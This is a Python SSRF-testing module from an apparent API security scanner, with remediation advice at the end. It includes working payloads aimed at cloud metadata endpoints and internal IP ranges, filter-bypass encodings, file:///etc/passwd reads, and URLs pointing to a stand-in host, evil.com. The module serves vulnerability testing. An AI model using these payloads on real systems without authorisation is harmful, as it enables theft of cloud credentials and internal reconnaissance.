"""
SSRF (Server-Side Request Forgery) attack module.

Tests API endpoints for SSRF vulnerabilities by injecting URLs
that the server might fetch, potentially accessing internal resources.
"""

import time
import re
from typing import Any, Optional
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Parameter,
    Severity,
    Vulnerability,
    SSRFResult
)


class SSRFAttacker:
    """Performs SSRF attacks on API endpoints."""
    
    # SSRF payloads for testing
    PAYLOADS = {
        # Internal network
        "localhost": [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://localhost:80",
            "http://127.0.0.1:80",
            "http://localhost:22",
            "http://127.0.0.1:22",
            "http://localhost:443",
            "http://localhost:8080",
            "http://localhost:3000",
        ],
        # Internal network ranges
        "internal": [
            "http://192.168.1.1",
            "http://192.168.0.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://169.254.169.254",  # AWS metadata
            "http://100.100.100.200",  # Alibaba metadata
            "http://metadata.google.internal",  # GCP metadata
        ],
        # Bypass attempts
        "bypass": [
            "http://localtest.me",
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
            "http://127.0.0.1.nip.io",
            "http://localhost.evil.com",
            "http://0x7f000001",  # Hex IP
            "http://2130706433",  # Decimal IP
            "http://0177.0.0.1",  # Octal IP
            "http://127.1",
            "http://127.0.1",
        ],
        # Protocol-based
        "protocols": [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "gopher://127.0.0.1:70",
            "dict://127.0.0.1:11211/stat",
            "sftp://evil.com",
            "ldap://evil.com",
            "tftp://evil.com",
        ],
        # Cloud metadata endpoints
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/metadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/openstack/latest/meta-data/",
        ],
    }
    
    # Indicators of successful SSRF
    SUCCESS_INDICATORS = [
        # AWS metadata
        "ami-id",
        "ami-launch-index",
        "ami-manifest-path",
        "instance-id",
        "instance-type",
        "local-hostname",
        "local-ipv4",
        "placement/",
        "security-groups",
        
        # GCP metadata
        "project-id",
        "numeric-project-id",
        "instance/",
        "machine-type",
        
        # File system indicators
        "root:",
        "/bin/bash",
        "/bin/sh",
        "daemon:",
        "nobody:",
        "sshd_config",
        
        # Network indicators
        "SSH-2.0",
        "HTTP/1.",
        "<!DOCTYPE",
        "<html",
        "Server:",
        
        # Error messages that reveal internal access
        "Connection refused",
        "Connection timed out",
        "No route to host",
        "Name or service not known",
        "curl:",
        "requests.exceptions",
        "urllib.error",
    ]
    
    def __init__(self, target_url: str, timeout: int = 5, callback_url: Optional[str] = None):
        """Initialize the SSRF attacker.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
            callback_url: URL to use for out-of-band testing (optional)
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.callback_url = callback_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/2.0.0 Security Scanner',
            'Accept': '*/*'
        })
    
    def attack(self, endpoint: Endpoint, parameters_to_test: Optional[list[str]] = None) -> list[AttackResult]:
        """Perform SSRF attacks on an endpoint.
        
        Args:
            endpoint: The endpoint to attack
            parameters_to_test: Specific parameter names to test
            
        Returns:
            List of attack results
        """
        results: list[AttackResult] = []
        
        # Get testable parameters
        params_to_test = self._get_testable_parameters(endpoint, parameters_to_test)
        
        if not params_to_test:
            return results
        
        # Test each parameter type
        for param in params_to_test:
            # Test localhost/internal access
            for category in ["localhost", "internal"]:
                for payload in self.PAYLOADS[category][:3]:  # Limit for speed
                    result = self._test_payload(endpoint, param, payload)
                    results.append(result)
                    
                    if result.success:
                        # Found vulnerability, test more payloads
                        for advanced_payload in self.PAYLOADS["bypass"][:3]:
                            adv_result = self._test_payload(endpoint, param, advanced_payload)
                            results.append(adv_result)
                        break
            
            # Test cloud metadata endpoints
            for payload in self.PAYLOADS["cloud_metadata"][:2]:
                result = self._test_payload(endpoint, param, payload)
                results.append(result)
        
        return results
    
    def _get_testable_parameters(
        self, 
        endpoint: Endpoint, 
        parameters_to_test: Optional[list[str]]
    ) -> list[Parameter]:
        """Get list of parameters that might be vulnerable to SSRF."""
        params = []
        
        # URL-related parameter names
        url_param_names = [
            'url', 'uri', 'link', 'src', 'source', 'target', 'redirect',
            'next', 'return', 'returnUrl', 'return_url', 'callback',
            'feed', 'file', 'path', 'domain', 'host', 'site', 'website',
            'proxy', 'request', 'fetch', 'load', 'page', 'image', 'img'
        ]
        
        for param in endpoint.parameters:
            if parameters_to_test and param.name not in parameters_to_test:
                continue
            
            # Check if parameter name suggests URL handling
            param_lower = param.name.lower()
            if any(url_param in param_lower for url_param in url_param_names):
                params.append(param)
            # Also test string parameters
            elif param.param_type == 'string':
                params.append(param)
        
        # Check request body for URL fields
        if endpoint.request_body:
            body_params = self._extract_url_body_parameters(endpoint.request_body)
            for param_name in body_params:
                params.append(Parameter(
                    name=param_name,
                    location='body',
                    param_type='string'
                ))
        
        return params
    
    def _extract_url_body_parameters(self, request_body: dict) -> list[str]:
        """Extract URL-related parameter names from request body."""
        params = []
        
        content = request_body.get('content', {})
        for content_type, content_schema in content.items():
            if 'application/json' in content_type:
                schema = content_schema.get('schema', {})
                properties = schema.get('properties', {})
                
                # Look for URL-related fields
                url_fields = ['url', 'uri', 'link', 'callback', 'webhook', 'image']
                for prop_name in properties.keys():
                    if any(field in prop_name.lower() for field in url_fields):
                        params.append(prop_name)
        
        return params
    
    def _test_payload(self, endpoint: Endpoint, param: Parameter, payload: str) -> AttackResult:
        """Test a single SSRF payload."""
        start_time = time.time()
        
        try:
            url = self._build_url(endpoint.path)
            
            # Build request based on method and parameter location
            if endpoint.method.value == 'GET':
                params = {param.name: payload}
                response = self.session.get(
                    url,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            else:
                body = {param.name: payload}
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json=body,
                    timeout=self.timeout,
                    allow_redirects=False
                )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check for SSRF vulnerability
            is_vulnerable, ssrf_type, evidence = self._check_ssrf_vulnerability(response, payload)
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SSRF,
                success=is_vulnerable,
                payload=payload,
                response_status=response.status_code,
                response_body=response.text[:500],
                duration_ms=duration_ms,
                extra_data={'ssrf_type': ssrf_type, 'evidence': evidence} if is_vulnerable else None
            )
            
        except requests.exceptions.Timeout:
            # Timeout might indicate successful connection to internal service
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SSRF,
                success=True,  # Potential blind SSRF
                payload=payload,
                error_message="Request timed out (potential blind SSRF)",
                extra_data={'ssrf_type': 'blind'}
            )
        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SSRF,
                success=False,
                payload=payload,
                error_message=str(e)
            )
    
    def _build_url(self, path: str) -> str:
        """Build full URL from path."""
        return f"{self.target_url}{path}"
    
    def _check_ssrf_vulnerability(
        self, 
        response: requests.Response, 
        payload: str
    ) -> tuple[bool, str, Optional[str]]:
        """Check if response indicates SSRF vulnerability.
        
        Returns:
            Tuple of (is_vulnerable, ssrf_type, evidence)
        """
        response_text = response.text.lower()
        
        # Check for cloud metadata indicators
        cloud_indicators = [
            ('ami-id', 'AWS metadata'),
            ('instance-id', 'AWS metadata'),
            ('project-id', 'GCP metadata'),
            ('metadata', 'Cloud metadata'),
        ]
        
        for indicator, meta_type in cloud_indicators:
            if indicator in response_text:
                return True, 'cloud_metadata', f"Found {meta_type} in response"
        
        # Check for file system indicators
        file_indicators = [
            ('root:', '/etc/passwd'),
            ('daemon:', '/etc/passwd'),
            ('nobody:', '/etc/passwd'),
            ('/bin/', 'file system'),
        ]
        
        for indicator, source in file_indicators:
            if indicator in response_text:
                return True, 'file_read', f"Read {source}"
        
        # Check for network service indicators
        network_indicators = [
            ('ssh-2.0', 'SSH'),
            ('http/1.', 'HTTP service'),
            ('smtp', 'SMTP'),
            ('ftp', 'FTP'),
        ]
        
        for indicator, service in network_indicators:
            if indicator in response_text:
                return True, 'network_scan', f"Accessed {service} service"
        
        # Check for error messages that reveal internal access attempts
        error_indicators = [
            'connection refused',
            'connection timed out',
            'no route to host',
            'name or service not known',
            'network is unreachable',
        ]
        
        for indicator in error_indicators:
            if indicator in response_text:
                # These errors suggest the server tried to connect
                return True, 'network_error', f"Server attempted to connect: {indicator}"
        
        # Check for response differences that suggest internal access
        if response.status_code in [200, 201, 202]:
            # Check if response contains internal network information
            internal_patterns = [
                r'192\.168\.\d+\.\d+',
                r'10\.\d+\.\d+\.\d+',
                r'172\.(1[6-9]|2[0-9]|3[0-1])\.\d+\.\d+',
                r'127\.0\.0\.1',
                r'localhost',
            ]
            
            for pattern in internal_patterns:
                if re.search(pattern, response_text):
                    return True, 'internal_access', "Internal IP exposed in response"
        
        return False, '', None
    
    def create_vulnerability(self, result: AttackResult, endpoint: Endpoint) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        ssrf_type = 'basic'
        evidence = ''
        
        if result.extra_data:
            ssrf_type = result.extra_data.get('ssrf_type', 'basic')
            evidence = result.extra_data.get('evidence', '')
        
        severity = Severity.HIGH
        if ssrf_type == 'cloud_metadata':
            severity = Severity.CRITICAL
        
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.SSRF,
            severity=severity,
            title=f"Server-Side Request Forgery (SSRF) in {endpoint.full_path}",
            description=(
                f"Server-Side Request Forgery (SSRF) vulnerability detected. "
                f"The server can be tricked into making requests to arbitrary URLs, "
                f"potentially accessing internal services, cloud metadata endpoints, "
                f"or reading local files. Type detected: {ssrf_type}. "
                f"This can lead to data exfiltration, internal network scanning, "
                f"and in severe cases, complete cloud account compromise."
            ),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Payload: {result.payload}\n"
                f"SSRF Type: {ssrf_type}\n"
                f"Evidence: {evidence}\n"
                f"Response Status: {result.response_status}"
            ),
            recommendation=(
                "1. Implement URL allowlists - only allow specific domains/URLs\n"
                "2. Block requests to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, etc.)\n"
                "3. Block requests to cloud metadata endpoints (169.254.169.254)\n"
                "4. Use a dedicated HTTP client with security controls\n"
                "5. Disable unnecessary URL schemes (file://, gopher://, etc.)\n"
                "6. Implement network segmentation\n"
                "7. Use IMDSv2 for AWS instances (requires token)"
            ),
            cwe_id="CWE-918",
            owasp_category="A10:2021 - Server-Side Request Forgery",
            response_evidence=result.response_body,
            cvss_score=9.8 if ssrf_type == 'cloud_metadata' else 8.6,
            references=[
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://portswigger.net/web-security/ssrf"
            ]
        )
